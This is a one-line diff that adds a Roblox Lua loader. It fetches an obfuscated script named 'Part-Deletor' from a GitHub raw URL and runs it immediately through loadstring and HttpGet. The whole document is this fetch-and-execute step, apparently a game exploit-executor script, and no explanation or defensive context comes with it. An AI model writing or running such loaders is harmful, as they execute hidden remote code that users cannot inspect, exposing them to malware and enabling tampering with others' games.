@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kreekman/Part-Deletor/main/RAW%20code%20(Obfuscated).lua"))()
